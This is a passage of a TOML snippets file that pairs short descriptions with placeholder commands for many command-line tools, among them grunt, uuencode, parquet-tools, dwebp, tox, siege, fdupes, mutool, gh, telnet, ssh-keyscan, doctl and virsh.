  command = "grunt --tasks <path/to/directory>"
  output = ""

[[snippets]]
  description = "Perform a dry-run without writing any files"
  command = "grunt --no-write"
  output = ""

[[snippets]]
  description = "Display help"
  command = "grunt --help"
  output = ""

[[snippets]]
  description = "List available tools"
  command = "go tool"
  output = ""

[[snippets]]
  description = "Run the go link tool"
  command = "go tool link <path/to/main.o>"
  output = ""

[[snippets]]
  description = "Print the command that would be executed, but do not execute it (similar to `whereis`)"
  command = "go tool -n <command> <arguments>"
  output = ""

[[snippets]]
  description = "View documentation for a specified tool"
  command = "go tool <command> --help"
  output = ""

[[snippets]]
  description = "Delete one or more local and remote Git branches"
  command = "git delete-branch <branch_name1 branch_name2 ...>"
  output = ""

[[snippets]]
  description = "Encode a file and print the result to `stdout`"
  command = "uuencode <path/to/input_file> <output_file_name_after_decoding>"
  output = ""

[[snippets]]
  description = "Encode a file and write the result to a file"
  command = "uuencode -o <path/to/output_file> <path/to/input_file> <output_file_name_after_decoding>"
  output = ""

[[snippets]]
  description = "Encode a file using Base64 instead of the default uuencode encoding and write the result to a file"
  command = "uuencode -m -o <path/to/output_file> <path/to/input_file> <output_file_name_after_decoding>"
  output = ""

[[snippets]]
  description = "Format output for a PostScript printer, saving the output to a file"
  command = "troff <path/to/input.roff> | grops > <path/to/output.ps>"
  output = ""

[[snippets]]
  description = "Format output for a PostScript printer using the [me] macro package, saving the output to a file"
  command = "troff -<me> <path/to/input.roff> | grops > <path/to/output.ps>"
  output = ""

[[snippets]]
  description = "Format output as [a]SCII text using the [man] macro package"
  command = "troff -T <ascii> -<man> <path/to/input.roff> | grotty"
  output = ""

[[snippets]]
  description = "Format output as a [pdf] file, saving the output to a file"
  command = "troff -T <pdf> <path/to/input.roff> | gropdf > <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a Nokia Operator Logo as hexcode"
  command = "pbmtonokia -fmt NEX_NOL -net <network_operator_code> <path/to/image.pbm> > <path/to/output.hex>"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a Nokia Group Graphic as hexcode"
  command = "pbmtonokia -fmt NEX_NGG <path/to/image.pbm> > <path/to/output.hex>"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a Nokia Picture Message with the specified text as hexcode"
  command = "pbmtonokia -fmt NEX_NPM -txt <text_message> <path/to/image.pbm> > <path/to/output.hex>"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a Nokia Operator Logo as a NOL file"
  command = "pbmtonokia -fmt NOL <path/to/image.pbm> > <path/to/output.nol>"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a Nokia Group Graphic as an NGG file"
  command = "pbmtonokia -fmt NGG <path/to/image.pbm> > <path/to/output.ngg>"
  output = ""

[[snippets]]
  description = "Convert a PBM image into a Nokia Picture Message as an NPM file"
  command = "pbmtonokia -fmt NPM <path/to/image.pbm> > <path/to/output.npm>"
  output = ""

[[snippets]]
  description = "Display the content of a Parquet file"
  command = "parquet-tools cat <path/to/parquet>"
  output = ""

[[snippets]]
  description = "Display the first few lines of a Parquet file"
  command = "parquet-tools head <path/to/parquet>"
  output = ""

[[snippets]]
  description = "Print the schema of a Parquet file"
  command = "parquet-tools schema <path/to/parquet>"
  output = ""

[[snippets]]
  description = "Print the metadata of a Parquet file"
  command = "parquet-tools meta <path/to/parquet>"
  output = ""

[[snippets]]
  description = "Print the content and metadata of a Parquet file"
  command = "parquet-tools dump <path/to/parquet>"
  output = ""

[[snippets]]
  description = "Concatenate several Parquet files into the target one"
  command = "parquet-tools merge <path/to/parquet1> <path/to/parquet2> <path/to/target_parquet>"
  output = ""

[[snippets]]
  description = "Print the count of rows in a Parquet file"
  command = "parquet-tools rowcount <path/to/parquet>"
  output = ""

[[snippets]]
  description = "Print the column and offset indexes of a Parquet file"
  command = "parquet-tools column-index <path/to/parquet>"
  output = ""

[[snippets]]
  description = "Convert a `webp` file into a `png` file"
  command = "dwebp <path/to/input.webp> -o <path/to/output.png>"
  output = ""

[[snippets]]
  description = "Convert a `webp` file into a specific filetype"
  command = "dwebp <path/to/input.webp> -bmp|-tiff|-pam|-ppm|-pgm|-yuv -o <path/to/output>"
  output = ""

[[snippets]]
  description = "Convert a `webp` file, using multi-threading if possible"
  command = "dwebp <path/to/input.webp> -o <path/to/output.png> -mt"
  output = ""

[[snippets]]
  description = "Convert a `webp` file, but also crop and scale at the same time"
  command = "dwebp <input.webp> -o <output.png> -crop <x_pos> <y_pos> <width> <height> -scale <width> <height>"
  output = ""

[[snippets]]
  description = "Convert a `webp` file and flip the output"
  command = "dwebp <path/to/input.webp> -o <path/to/output.png> -flip"
  output = ""

[[snippets]]
  description = "Convert a `webp` file and don't use in-loop filtering to speed up the decoding process"
  command = "dwebp <path/to/input.webp> -o <path/to/output.png> -nofilter"
  output = ""

[[snippets]]
  description = "View documentation for `gcc`"
  command = "tldr gcc"
  output = ""

[[snippets]]
  description = "Run tests on all test environments"
  command = "tox"
  output = ""

[[snippets]]
  description = "Create a `tox.ini` configuration"
  command = "tox-quickstart"
  output = ""

[[snippets]]
  description = "List the available environments"
  command = "tox --listenvs-all"
  output = ""

[[snippets]]
  description = "Run tests on a specific environment (e.g. Python 3.6)"
  command = "tox -e <py36>"
  output = ""

[[snippets]]
  description = "Force the virtual environment to be recreated"
  command = "tox --recreate -e <py27>"
  output = ""

[[snippets]]
  description = "Compare two images"
  command = "compare <path/to/image1.png> <path/to/image2.png> <path/to/diff.png>"
  output = ""

[[snippets]]
  description = "Compare two images using the specified metric"
  command = "compare -verbose -metric <PSNR> <path/to/image1.png> <path/to/image2.png> <path/to/diff.png>"
  output = ""

[[snippets]]
  description = "Update the list of available packages and versions (it's recommended to run this before other `paci` commands)"
  command = "paci refresh"
  output = ""

[[snippets]]
  description = "Configure its behaviour"
  command = "paci configure"
  output = ""

[[snippets]]
  description = "Search for a given package"
  command = "paci search <package>"
  output = ""

[[snippets]]
  description = "Install a package"
  command = "paci install <package>"
  output = ""

[[snippets]]
  description = "Update a package"
  command = "paci update <package>"
  output = ""

[[snippets]]
  description = "Convert a PAM image to an XV thumbnail picture"
  command = "pamtoxvmini <path/to/input_file.pam> > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Output char and line number of the first difference between two files"
  command = "cmp <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Output info of the first difference: char, line number, bytes, and values"
  command = "cmp --print-bytes <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Output the byte numbers and values of every difference"
  command = "cmp --verbose <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare files but output nothing, yield only the exit status"
  command = "cmp --quiet <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Look for security issues in the project dependencies (based on the `composer.lock` file in the current directory)"
  command = "security-checker security:check"
  output = ""

[[snippets]]
  description = "Use a specific `composer.lock` file"
  command = "security-checker security:check <path/to/composer.lock>"
  output = ""

[[snippets]]
  description = "Return results as a JSON object"
  command = "security-checker security:check --format=json"
  output = ""

[[snippets]]
  description = "Create a project using a specific preset"
  command = "kool create <preset> <project_name>"
  output = ""

[[snippets]]
  description = "Run a specific script defined in the `kool.yml` file in the current directory"
  command = "kool run <script>"
  output = ""

[[snippets]]
  description = "Start/stop services in the current directory"
  command = "kool <start|stop>"
  output = ""

[[snippets]]
  description = "Display status of the services in the current directory"
  command = "kool status"
  output = ""

[[snippets]]
  description = "Update to the latest version"
  command = "kool self-update"
  output = ""

[[snippets]]
  description = "Print the completion script for the specified shell"
  command = "kool completion <bash|fish|powershell|zsh>"
  output = ""

[[snippets]]
  description = "Remove an installed binary"
  command = "cargo remove <package_spec>"
  output = ""

[[snippets]]
  description = "Print indices and names of all columns"
  command = "csvcut -n <data.csv>"
  output = ""

[[snippets]]
  description = "Extract the first and third columns"
  command = "csvcut -c <1,3> <data.csv>"
  output = ""

[[snippets]]
  description = "Extract all columns except the fourth one"
  command = "csvcut -C <4> <data.csv>"
  output = ""

[[snippets]]
  description = "Extract the columns named "id" and "first name" (in that order)"
  command = "csvcut -c <id,""first name""> <data.csv>"
  output = ""

[[snippets]]
  description = "Test a URL with default settings"
  command = "siege <https://example.com>"
  output = ""

[[snippets]]
  description = "Test a list of URLs"
  command = "siege --file <path/to/url_list.txt>"
  output = ""

[[snippets]]
  description = "Test list of URLs in a random order (Simulates internet traffic)"
  command = "siege --internet --file <path/to/url_list.txt>"
  output = ""

[[snippets]]
  description = "Benchmark a list of URLs (without waiting between requests)"
  command = "siege --benchmark --file <path/to/url_list.txt>"
  output = ""

[[snippets]]
  description = "Set the amount of concurrent connections"
  command = "siege --concurrent=<50> --file <path/to/url_list.txt>"
  output = ""

[[snippets]]
  description = "Set how long for the siege to run for"
  command = "siege --time=<30s> --file <path/to/url_list.txt>"
  output = ""

[[snippets]]
  description = "Add text to a PPM image at the specified location"
  command = "ppmlabel -x <pos_x> -y <pos_y> -text <text> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Add multiple texts at different locations"
  command = "ppmlabel -x <pos_x1> -y <pos_y1> -text <text1> -x <pos_x2> -y <pos_y2> -text <text2> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Specify the line color, the background color, the tilt and the size of the added text"
  command = "ppmlabel -x <pos_x> -y <pos_y> -color <line_color> -background <background_color> -angle <tilt> -size <size> -text <text> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Search a single directory"
  command = "fdupes <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search multiple directories"
  command = "fdupes <directory1> <directory2>"
  output = ""

[[snippets]]
  description = "Search a directory recursively"
  command = "fdupes -r <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search multiple directories, one recursively"
  command = "fdupes <directory1> -R <directory2>"
  output = ""

[[snippets]]
  description = "Search recursively and replace duplicates with hardlinks"
  command = "fdupes -rH <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search recursively for duplicates and display interactive prompt to pick which ones to keep, deleting the others"
  command = "fdupes -rd <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search recursively and delete duplicates without prompting"
  command = "fdupes -rdN <path/to/directory>"
  output = ""

[[snippets]]
  description = "Write a commit-graph file for the packed commits in the repository's local `.git` directory"
  command = "git commit-graph write"
  output = ""

[[snippets]]
  description = "Write a commit-graph file containing all reachable commits"
  command = "git show-ref --hash | git commit-graph write --stdin-commits"
  output = ""

[[snippets]]
  description = "Write a commit-graph file containing all commits in the current commit-graph file along with those reachable from `HEAD`"
  command = "git rev-parse <HEAD> | git commit-graph write --stdin-commits --append"
  output = ""

[[snippets]]
  description = "Display the histogram for human reading"
  command = "pgmhist <path/to/image.pgm>"
  output = ""

[[snippets]]
  description = "Display the median grey value"
  command = "pgmhist -median <path/to/image.pgm>"
  output = ""

[[snippets]]
  description = "Display four quartile grey value"
  command = "pgmhist -quartile <path/to/image.pgm>"
  output = ""

[[snippets]]
  description = "Report the existence of invalid grey values"
  command = "pgmhist -forensic <path/to/image.pgm>"
  output = ""

[[snippets]]
  description = "Display machine-readable output"
  command = "pgmhist -machine <path/to/image.pgm>"
  output = ""

[[snippets]]
  description = "Perform antialiasing on a PNM image, taking black pixels as background and white pixels as foreground"
  command = "pnmalias <path/to/input.pnm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Explicitly specify the background and foreground color"
  command = "pnmalias -bcolor <background_color> -fcolor <foreground_color> <path/to/input.pnm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Apply altialiasing to foreground pixels only"
  command = "pnmalias -fonly <path/to/input.pnm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Apply antialiasing to all surrounding pixels of background pixels"
  command = "pnmalias -balias <path/to/input.pnm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Compile a source file into an executable"
  command = "iverilog <path/to/source.v> -o <path/to/executable>"
  output = ""

[[snippets]]
  description = "Compile a source file into an executable while displaying all warnings"
  command = "iverilog <path/to/source.v> -Wall -o <path/to/executable>"
  output = ""

[[snippets]]
  description = "Compile and run explicitly using the VVP runtime"
  command = "iverilog -o <path/to/executable> -tvvp <path/to/source.v>"
  output = ""

[[snippets]]
  description = "Compile using Verilog library files from a different path"
  command = "iverilog <path/to/source.v> -o <path/to/executable> -I<path/to/library_directory>"
  output = ""

[[snippets]]
  description = "Preprocess Verilog code without compiling"
  command = "iverilog -E <path/to/source.v>"
  output = ""

[[snippets]]
  description = "Download songs from the provided URLs and embed metadata"
  command = "spotdl <open.spotify.com/playlist/playlistId open.spotify.com/track/trackId ...>"
  output = ""

[[snippets]]
  description = "Start a web interface to download individual songs"
  command = "spotdl web"
  output = ""

[[snippets]]
  description = "Save only the metadata without downloading anything"
  command = "spotdl save <open.spotify.com/playlist/playlistId ...> --save-file <path/to/save_file.spotdl>"
  output = ""

[[snippets]]
  description = "List files one per line"
  command = "exa --oneline"
  output = ""

[[snippets]]
  description = "List all files, including hidden files"
  command = "exa --all"
  output = ""

[[snippets]]
  description = "Long format list (permissions, ownership, size and modification date) of all files"
  command = "exa --long --all"
  output = ""

[[snippets]]
  description = "List files with the largest at the top"
  command = "exa --reverse --sort=<size>"
  output = ""

[[snippets]]
  description = "Display a tree of files, three levels deep"
  command = "exa --long --tree --level=<3>"
  output = ""

[[snippets]]
  description = "List files sorted by modification date (oldest first)"
  command = "exa --long --sort=<modified>"
  output = ""

[[snippets]]
  description = "List files with their headers, icons, and Git statuses"
  command = "exa --long --header --icons --git"
  output = ""

[[snippets]]
  description = "Don't list files mentioned in `.gitignore`"
  command = "exa --git-ignore"
  output = ""

[[snippets]]
  description = "Replace the specified text in the current repository"
  command = "git sed '<find_text>' '<replace_text>'"
  output = ""

[[snippets]]
  description = "Replace the specified text and then commit the resulting changes with a standard commit message"
  command = "git sed -c '<find_text>' '<replace_text>'"
  output = ""

[[snippets]]
  description = "Replace the specified text, using regular expressions"
  command = "git sed -f g '<find_text>' '<replace_text>'"
  output = ""

[[snippets]]
  description = "Replace a specific text in all files under a given directory"
  command = "git sed '<find_text>' '<replace_text>' -- <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open a PDF file"
  command = "xpdf <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Open a specific page in a PDF file"
  command = "xpdf <path/to/file.pdf> :<page_number>"
  output = ""

[[snippets]]
  description = "Open a compressed PDF file"
  command = "xpdf <path/to/file.pdf.tar>"
  output = ""

[[snippets]]
  description = "Open a PDF file in fullscreen mode"
  command = "xpdf -fullscreen <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Specify the initial zoom"
  command = "xpdf -z <75>% <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Specify the initial zoom at page width or full page"
  command = "xpdf -z <page|width> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Convert a range of pages to PNGs (Note: `%nd` in the output placeholder must be replaced with a print modifier like `%d` or `%2d`)"
  command = "mutool convert -o <path/to/output%nd.png> <path/to/input.pdf> <1-10>"
  output = ""

[[snippets]]
  description = "Convert one or more pages of a PDF into text in `stdout`"
  command = "mutool draw -F txt <path/to/input.pdf> <2,3,5,...>"
  output = ""

[[snippets]]
  description = "Concatenate multiple PDF files"
  command = "mutool merge -o <path/to/output.pdf> <path/to/input1.pdf path/to/input2.pdf ...>"
  output = ""

[[snippets]]
  description = "Query information about all content embedded in a PDF"
  command = "mutool info <path/to/input.pdf>"
  output = ""

[[snippets]]
  description = "Extract all images, fonts and resources embedded in a PDF to the current directory"
  command = "mutool extract <path/to/input.pdf>"
  output = ""

[[snippets]]
  description = "Show the outline (table of contents) of a PDF"
  command = "mutool show <path/to/input.pdf> outline"
  output = ""

[[snippets]]
  description = "Transform a raw HTML file into a cleaned, indented, and colored format"
  command = "cat <index.html> | pup --color"
  output = ""

[[snippets]]
  description = "Filter HTML by element tag name"
  command = "cat <index.html> | pup '<tag>'"
  output = ""

[[snippets]]
  description = "Filter HTML by id"
  command = "cat <index.html> | pup '<div#id>'"
  output = ""

[[snippets]]
  description = "Filter HTML by attribute value"
  command = "cat <index.html> | pup '<input[type=""text""]>'"
  output = ""

[[snippets]]
  description = "Print all text from the filtered HTML elements and their children"
  command = "cat <index.html> | pup '<div> text{}'"
  output = ""

[[snippets]]
  description = "Print HTML as JSON"
  command = "cat <index.html> | pup '<div> json{}'"
  output = ""

[[snippets]]
  description = "Initialize a new Dart project in a directory of the same name"
  command = "dart create <project_name>"
  output = ""

[[snippets]]
  description = "Run a Dart file"
  command = "dart run <path/to/file.dart>"
  output = ""

[[snippets]]
  description = "Download dependencies for the current project"
  command = "dart pub get"
  output = ""

[[snippets]]
  description = "Run unit tests for the current project"
  command = "dart test"
  output = ""

[[snippets]]
  description = "Update an outdated project's dependencies to support null-safety"
  command = "dart pub upgrade --null-safety"
  output = ""

[[snippets]]
  description = "Compile a Dart file to a native binary"
  command = "dart compile exe <path/to/file.dart>"
  output = ""

[[snippets]]
  description = "Run each command, providing each one with a distinct copy of `stdin`"
  command = "pee <command1 command2 ...>"
  output = ""

[[snippets]]
  description = "Write a copy of `stdin` to `stdout` (like `tee`)"
  command = "pee cat <command1 command2 ...>"
  output = ""

[[snippets]]
  description = "Immediately terminate upon SIGPIPEs and write errors"
  command = "pee --no-ignore-sigpipe --no-ignore-write-errors <command1 command2 ...>"
  output = ""

[[snippets]]
  description = "Create a new Gist from one or more files"
  command = "gh gist create <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Create a new Gist with a specific [desc]ription"
  command = "gh gist create <path/to/file1 path/to/file2 ...> --desc ""<description>"""
  output = ""

[[snippets]]
  description = "Edit a Gist"
  command = "gh gist edit <id|url>"
  output = ""

[[snippets]]
  description = "List up to 42 Gists owned by the currently logged in user"
  command = "gh gist list --limit <42>"
  output = ""

[[snippets]]
  description = "View a Gist in the default browser without rendering Markdown"
  command = "gh gist view <id|url> --web --raw"
  output = ""

[[snippets]]
  description = "Check pathnames for validity in the current system"
  command = "pathchk <path1 path2 …>"
  output = ""

[[snippets]]
  description = "Check pathnames for validity on a wider range of POSIX compliant systems"
  command = "pathchk -p <path1 path2 …>"
  output = ""

[[snippets]]
  description = "Check pathnames for validity on all POSIX compliant systems"
  command = "pathchk --portability <path1 path2 …>"
  output = ""

[[snippets]]
  description = "Only check for empty pathnames or leading dashes (-)"
  command = "pathchk -P <path1 path2 …>"
  output = ""

[[snippets]]
  description = "Check for a running ssh-agent, and start one if needed"
  command = "keychain"
  output = ""

[[snippets]]
  description = "Also check for gpg-agent"
  command = "keychain --agents ""<gpg,ssh>"""
  output = ""

[[snippets]]
  description = "List signatures of all active keys"
  command = "keychain --list"
  output = ""

[[snippets]]
  description = "List fingerprints of all active keys"
  command = "keychain --list-fp"
  output = ""

[[snippets]]
  description = "Add a timeout for identities added to the agent, in minutes"
  command = "keychain --timeout <minutes>"
  output = ""

[[snippets]]
  description = "Compile a DVI (Device Independent file) document from every source"
  command = "latexmk"
  output = ""

[[snippets]]
  description = "Compile a DVI document from a specific source file"
  command = "latexmk <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a PDF document"
  command = "latexmk -pdf <source.tex>"
  output = ""

[[snippets]]
  description = "Force the generation of a document even if there are errors"
  command = "latexmk -f <source.tex>"
  output = ""

[[snippets]]
  description = "Clean up temporary TEX files created for a specific TEX file"
  command = "latexmk -c <source.tex>"
  output = ""

[[snippets]]
  description = "Clean up all temporary TEX files in the current directory"
  command = "latexmk -c"
  output = ""

[[snippets]]
  description = "Run without arguments to use the interactive interface"
  command = "fkill"
  output = ""

[[snippets]]
  description = "Kill the process by PID, name or port"
  command = "fkill <pid|name|:port>"
  output = ""

[[snippets]]
  description = "Extract strongly connected components of one or more directed graphs"
  command = "sccmap -S <path/to/input1.gv> <path/to/input2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Print statistics about a graph, producing no output graph"
  command = "sccmap -v -s <path/to/input1.gv> <path/to/input2.gv ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "sccmap -?"
  output = ""

[[snippets]]
  description = "Move a file inside the repo and add the movement to the next commit"
  command = "git mv <path/to/file> <new/path/to/file>"
  output = ""

[[snippets]]
  description = "Rename a file or directory and add the renaming to the next commit"
  command = "git mv <path/to/file_or_directory> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Overwrite the file or directory in the target path if it exists"
  command = "git mv --force <path/to/file_or_directory> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Generate an image from a specific source file"
  command = "silicon <path/to/source_file> --output <path/to/output_image>"
  output = ""

[[snippets]]
  description = "Generate an image from a source file with a specific programming language syntax highlighting (e.g. `rust`, `py`, `js`, etc.)"
  command = "silicon <path/to/source_file> --output <path/to/output_image> --language <language|extension>"
  output = ""

[[snippets]]
  description = "Generate an image from `stdin`"
  command = "<command> | silicon --output <path/to/output_image>"
  output = ""

[[snippets]]
  description = "Search for an exact string in a file"
  command = "fgrep <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "Search only lines that match entirely in one or more files"
  command = "fgrep -x <search_string> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Count the number of lines that match the given string in a file"
  command = "fgrep -c <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "Show the line number in the file along with the line matched"
  command = "fgrep -n <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "Display all lines except those that contain the search string"
  command = "fgrep -v <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "Display filenames whose content matches the search string at least once"
  command = "fgrep -l <search_string> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Align sequences to user provided [r]eference, [o]utputting the alignment to a file"
  command = "nextclade run <path/to/sequences.fa> -r <path/to/reference.fa> -o <path/to/alignment.fa>"
  output = ""

[[snippets]]
  description = "Create a [t]SV report, auto-downloading the latest [d]ataset"
  command = "nextclade run <path/to/fasta> -d <dataset_name> -t <path/to/report.tsv>"
  output = ""

[[snippets]]
  description = "List all available datasets"
  command = "nextclade dataset list"
  output = ""

[[snippets]]
  description = "Download the latest SARS-CoV-2 dataset"
  command = "nextclade dataset get --name sars-cov-2 --output-dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Use a downloaded [D]ataset, producing all [O]utputs"
  command = "nextclade run -D <path/to/dataset_dir> -O <path/to/output_dir> <path/to/sequences.fasta>"
  output = ""

[[snippets]]
  description = "Run on multiple files"
  command = "nextclade run -d <dataset_name> -t <path/to/output_tsv> -- <path/to/input_fasta_1 path/to/input_fasta_2 ...>"
  output = ""

[[snippets]]
  description = "Try reverse complement if sequence does not align"
  command = "nextclade run --retry-reverse-complement -d <dataset_name> -t <path/to/output_tsv> <path/to/input_fasta>"
  output = ""

[[snippets]]
  description = "Print a completion script"
  command = "gh completion --shell <bash|zsh|fish|powershell>"
  output = ""

[[snippets]]
  description = "Append the `gh` completion script to `~/.bashrc`"
  command = "gh completion --shell <bash> >> <~/.bashrc>"
  output = ""

[[snippets]]
  description = "Append the `gh` completion script to `~/.zshrc`"
  command = "gh completion --shell <zsh> >> <~/.zshrc>"
  output = ""

[[snippets]]
  description = "Display the subcommand help"
  command = "gh completion"
  output = ""

[[snippets]]
  description = "Show the status of a process (or all processes if `process_name` is not specified)"
  command = "supervisorctl status <process_name>"
  output = ""

[[snippets]]
  description = "Start/stop/restart a process"
  command = "supervisorctl <start|stop|restart> <process_name>"
  output = ""

[[snippets]]
  description = "Start/stop/restart all processes in a group"
  command = "supervisorctl <start|stop|restart> <group_name>:*"
  output = ""

[[snippets]]
  description = "Show last 100 bytes of process `stderr`"
  command = "supervisorctl tail -100 <process_name> stderr"
  output = ""

[[snippets]]
  description = "Keep displaying `stdout` of a process"
  command = "supervisorctl tail -f <process_name> stdout"
  output = ""

[[snippets]]
  description = "Reload process configuration file to add/remove processes as necessary"
  command = "supervisorctl update"
  output = ""

[[snippets]]
  description = "Run text-to-speech with the default models, writing the output to "tts_output.wav""
  command = "tts --text ""<text>"""
  output = ""

[[snippets]]
  description = "List provided models"
  command = "tts --list_models"
  output = ""

[[snippets]]
  description = "Query info for a model by idx"
  command = "tts --model_info_by_idx <model_type/model_query_idx>"
  output = ""

[[snippets]]
  description = "Query info for a model by name"
  command = "tts --model_info_by_name <model_type/language/dataset/model_name>"
  output = ""

[[snippets]]
  description = "Run a text-to-speech model with its default vocoder model"
  command = "tts --text ""<text>"" --model_name <model_type/language/dataset/model_name>"
  output = ""

[[snippets]]
  description = "Run your own text-to-speech model (using the Griffin-Lim vocoder)"
  command = "tts --text ""<text>"" --model_path <path/to/model.pth> --config_path <path/to/config.json> --out_path <path/to/file.wav>"
  output = ""

[[snippets]]
  description = "Telnet to the default port of a host"
  command = "telnet <host>"
  output = ""

[[snippets]]
  description = "Telnet to a specific port of a host"
  command = "telnet <ip_address> <port>"
  output = ""

[[snippets]]
  description = "Exit a telnet session"
  command = "quit"
  output = ""

[[snippets]]
  description = "Emit the default escape character combination for terminating the session"
  command = "<Ctrl> + ]"
  output = ""

[[snippets]]
  description = "Start `telnet` with "x" as the session termination character"
  command = "telnet -e <x> <ip_address> <port>"
  output = ""

[[snippets]]
  description = "Telnet to Star Wars animation"
  command = "telnet <towel.blinkenlights.nl>"
  output = ""

[[snippets]]
  description = "Start the interactive shell"
  command = "irb"
  output = ""

[[snippets]]
  description = "Convert an SPU file to a PPM image"
  command = "sputoppm <path/to/input.spu> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Retrieve all public ssh keys of a remote host"
  command = "ssh-keyscan <host>"
  output = ""

[[snippets]]
  description = "Retrieve all public ssh keys of a remote host listening on a specific port"
  command = "ssh-keyscan -p <port> <host>"
  output = ""

[[snippets]]
  description = "Retrieve certain types of public ssh keys of a remote host"
  command = "ssh-keyscan -t <rsa,dsa,ecdsa,ed25519> <host>"
  output = ""

[[snippets]]
  description = "Manually update the ssh known_hosts file with the fingerprint of a given host"
  command = "ssh-keyscan -H <host> >> ~/.ssh/known_hosts"
  output = ""

[[snippets]]
  description = "Enable the ability to commit changes of a previously-locked local file"
  command = "git unlock <path/to/file>"
  output = ""

[[snippets]]
  description = "Run a `doctl databases` command with an access token"
  command = "doctl databases <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Get details for a database cluster"
  command = "doctl databases get"
  output = ""

[[snippets]]
  description = "List your database clusters"
  command = "doctl databases list"
  output = ""

[[snippets]]
  description = "Create a database cluster"
  command = "doctl databases create <database_name>"
  output = ""

[[snippets]]
  description = "Delete a cluster"
  command = "doctl databases delete <database_id>"
  output = ""

[[snippets]]
  description = "List the name, state, and whether autostart is enabled or disabled for active storage pools"
  command = "virsh pool-list"
  output = ""

[[snippets]]
  description = "List information for active and inactive or just inactive storage pools"
  command = "virsh pool-list --<all|inactive>"
  output = ""

[[snippets]]
  description = "List extended information about persistence, capacity, allocation, and available space for active storage pools"
  command = "virsh pool-list --details"
  output = ""

[[snippets]]
  description = "List information for active storage pools with either autostart enabled or disabled"
  command = "virsh pool-list --<autostart|no-autostart>"
  output = ""

[[snippets]]
  description = "List information for active storage pools that are either persistent or transient"
  command = "virsh pool-list --<persistent|transient>"
  output = ""

[[snippets]]
  description = "List the name and UUID of active storage pools"
  command = "virsh pool-list --name --uuid"
  output = ""

[[snippets]]
  description = "Analyze specific directory"
  command = "dua <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display apparent size instead of disk usage"
  command = "dua --apparent-size"
  output = ""

[[snippets]]
  description = "Count hard-linked files each time they are seen"
  command = "dua --count-hard-links"
  output = ""

[[snippets]]
  description = "Aggregate the consumed space of one or more directories or files"
  command = "dua aggregate"
  output = ""

[[snippets]]
  description = "Launch the terminal user interface"
  command = "dua interactive"
  output = ""

[[snippets]]
  description = "Format printing byte counts"
  command = "dua --format <metric|binary|bytes|GB|GiB|MB|MiB>"
  output = ""

[[snippets]]
  description = "Use a specific number of threads (defaults to the process number of threads)"
  command = "dua --threads <count>"
  output = ""

[[snippets]]
  description = "Show the feed of a given URL and wait for new entries appearing at the bottom"
  command = "rsstail -u <url>"
  output = ""

[[snippets]]
  description = "Show the feed in reverse chronological order (newer at the bottom)"
  command = "rsstail -r -u <url>"
  output = ""

[[snippets]]
  description = "Include publication date and link"
  command = "rsstail -pl -u <url>"
  output = ""

[[snippets]]
  description = "Set update interval"
  command = "rsstail -u <url> -i <interval_in_seconds>"
  output = ""

[[snippets]]
  description = "Show feed and exit"
  command = "rsstail -1 -u <url>"
  output = ""

[[snippets]]
  description = "Analyze duplicated code for a specific file or directory"
  command = "phpcpd <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Analyze using fuzzy matching for variable names"
  command = "phpcpd --fuzzy <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Specify a minimum number of identical lines (defaults to 5)"
  command = "phpcpd --min-lines <number_of_lines> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Specify a minimum number of identical tokens (defaults to 70)"
  command = "phpcpd --min-tokens <number_of_tokens> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Exclude a directory from analysis (must be relative to the source)"
  command = "phpcpd --exclude <path/to/excluded_directory> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Output the results to a PHP-CPD XML file"
  command = "phpcpd --log-pmd <path/to/log_file> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Check the style of a file"
  command = "vale <path/to/file>"
  output = ""

[[snippets]]
  description = "Check the style of a file with a specified configuration"
  command = "vale --config='<path/to/.vale.ini>' <path/to/file>"
  output = ""

[[snippets]]
  description = "Output the results in JSON format"
  command = "vale --output=JSON <path/to/file>"
